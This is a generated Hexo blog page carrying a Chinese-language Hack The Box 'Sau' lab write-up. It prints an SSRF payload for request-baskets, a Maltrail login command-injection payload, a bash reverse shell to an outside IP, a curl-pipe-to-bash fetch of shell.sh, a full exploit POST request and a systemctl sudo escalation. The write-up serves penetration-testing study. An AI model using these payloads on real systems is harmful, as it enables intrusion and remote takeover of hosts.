@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Sau | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="记录在Hackthebox平台上的渗透学习，主要关于request-baskets ssrf漏洞、Maltrail命令执行漏洞、curl反弹shell。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sau">
+<meta property="og:url" content="http://example.com/2023/08/16/Sau/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="记录在Hackthebox平台上的渗透学习，主要关于request-baskets ssrf漏洞、Maltrail命令执行漏洞、curl反弹shell。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/Sau/1690802513151.png">
+<meta property="og:image" content="http://example.com/Sau/1690807761627.png">
+<meta property="og:image" content="http://example.com/Sau/1690807934353.png">
+<meta property="og:image" content="http://example.com/Sau/1690808458288.png">
+<meta property="og:image" content="http://example.com/Sau/5889e9e7f4194b38ba4f249c1061172b.png">
+<meta property="article:published_time" content="2023-08-15T16:27:48.000Z">
+<meta property="article:modified_time" content="2023-08-15T16:35:03.542Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/Sau/1690802513151.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Sau" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/16/Sau/" class="article-date">
+  <time class="dt-published" datetime="2023-08-15T16:27:48.000Z" itemprop="datePublished">2023-08-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Sau
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>记录在Hackthebox平台上的渗透学习，主要关于request-baskets ssrf漏洞、Maltrail命令执行漏洞、curl反弹shell。</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 10.10.11.224</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Sau/1690802513151.png" alt="1690802513151"></p>
+<p>发现22、80、55555三个开放的端口，只有55555端口可以访问。</p>
+<p>访问<code>10.10.11.224:55555</code>，发现是一个web服务， 界面显示Request Baskets，版本是1.2.1。查询发现存在<strong>request-baskets服务端请求伪造漏洞（CVE-2023-27163）</strong>。</p>
+<h3 id="request-baskets-ssrf漏洞"><a href="#request-baskets-ssrf漏洞" class="headerlink" title="request-baskets ssrf漏洞"></a>request-baskets ssrf漏洞</h3><p>request baskets服务存在api接口&#x2F;api&#x2F;baskets&#x2F;{name}，&#x2F;baskets&#x2F;{name}，这里的name可以任意，这些接口会接收一个forward_url参数，而这个参数存在SSRF漏洞。<br>向&#x2F;api&#x2F;baskets&#x2F;{name}发送forward_url参数后，需要访问10.10.11.224:55555&#x2F;{name}来触发SSRF漏洞（请求给定的forward_url）。<br>可以实现55555端口访问其他端口内容的效果（如直接访问80端口被拦截，但是通过这个SSRF漏洞，让靶机主机访问80端口，再把内容显示在55555端口。</p>
+<p>访问url：<code>10.10.11.224:55555/api/baskets/aaa</code></p>
+<p>burp抓包，将GET修改为POST，添加如下请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;, #进入原本无法进入的80端口页面</span><br><span class="line">  &quot;proxy_response&quot;: true,</span><br><span class="line">  &quot;insecure_tls&quot;: false,</span><br><span class="line">  &quot;expand_path&quot;: true,</span><br><span class="line">  &quot;capacity&quot;: 250</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>forward_url是请求的url，因为不知道80端口的网站具体有什么内容，所以是路径直接是&#x2F;。</li>
+<li>proxy_response设置为true，允许请求的url内容转发给<code>10.10.11.224:55555/aaa</code>。</li>
+</ul>
+<p>得到token：<code>X4UY9t6SKl-YWNI76FIWp5SJV84wUULEXYDWnYdFCl2J</code></p>
+<p><img src="/Sau/1690807761627.png" alt="1690807761627"></p>
+<p><img src="/Sau/1690807934353.png" alt="1690807934353"></p>
+<p>访问url：<code>http://10.10.11.224:55555/aaa</code></p>
+<p><img src="/Sau/1690808458288.png" alt="1690808458288"></p>
+<h3 id="Maltrail命令执行漏洞"><a href="#Maltrail命令执行漏洞" class="headerlink" title="Maltrail命令执行漏洞"></a>Maltrail命令执行漏洞</h3><p>地址：<code>https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87</code></p>
+<p>漏洞描述：<strong>Maltrail &lt;&#x3D; V0.54 在登录过程中容易受到未经身份验证的操作系统命令注入的影响。</strong></p>
+<p>利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=;`curl &#x27;http://hostname:8338/login&#x27; \ --data &#x27;username=;`id &gt; /tmp/bbq`&#x27;`</span><br></pre></td></tr></table></figure>
+
+<p>这个反弹shell的命令需要是login页面，执行id命令并将内容输出到&#x2F;tmp&#x2F;bbq。因此在上一步应该修改为<code>&quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;</code>，访问回显login failed说明页面存在。</p>
+<h3 id="利用curl指令，执行sh脚本，反弹shell"><a href="#利用curl指令，执行sh脚本，反弹shell" class="headerlink" title="利用curl指令，执行sh脚本，反弹shell"></a>利用curl指令，执行sh脚本，反弹shell</h3><p>利用bash反弹shell编辑shell.sh文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp;/dev/tcp/43.153.208.212/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>因为80端口是http服务，所以我们需要开启服务：<code>python3 -m http.server &#39;端口&#39;</code>,curl的必须与其一致</p>
+<p>根据Maltrail漏洞利用方式，使用curl指令调用shell.sh反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=;`curl 43.153.208.212:端口/shell.sh|bash`			 </span><br><span class="line">username=%3b%60curl+43.153.208.212%2fshell.sh%7cbash%60</span><br></pre></td></tr></table></figure>
+
+<p>完整post：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /bbb HTTP/1.1</span><br><span class="line">Host: 10.10.11.224:55555</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 52</span><br><span class="line">Content-Type: application/x-www-form-urlencoded #解析url编码</span><br><span class="line"></span><br><span class="line">username=%3b%60curl+43.153.208.212:8085%2fshell.sh%7cbash%60</span><br></pre></td></tr></table></figure>
+
+<p>监听获得shell：<code>nc -lvvp 12345</code> 12345是shell.sh中的端口</p>
+<p>在&#x2F;home&#x2F;puma下得到flag1。</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>先通过python进入全交互界面<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>sudo -l查看权限 </p>
+<p><img src="/Sau/5889e9e7f4194b38ba4f249c1061172b.png" alt="在这里插入图片描述"> </p>
+<p>提示systemctl可以不输入密码执行，去gtfobins上搜下<code>https://gtfobins.github.io/#tra</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
+
+<p>systemctl sudo提权，可以无密码sudo systemctl status 某个服务，运行后，输入!sh提权 </p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zrk3034197094/article/details/131806218">(56条消息) hackthebox Sau靶场通关记录 | request baskets漏洞 | maltrail漏洞 | systemctl提权_几度夕阳红_的博客-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/131919772">(56条消息) hackthebox—Sau_yu22x的博客-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/123898780">(56条消息) 反弹shell的方法总结(base64绕过等等)_curl反弹shell_J0hnson666的博客-CSDN博客</a> </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/16/Sau/" data-id="cllciyklw00007guleieb0twa" data-title="Sau" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/08/15/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/08/16/Sau/">Sau</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/15/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
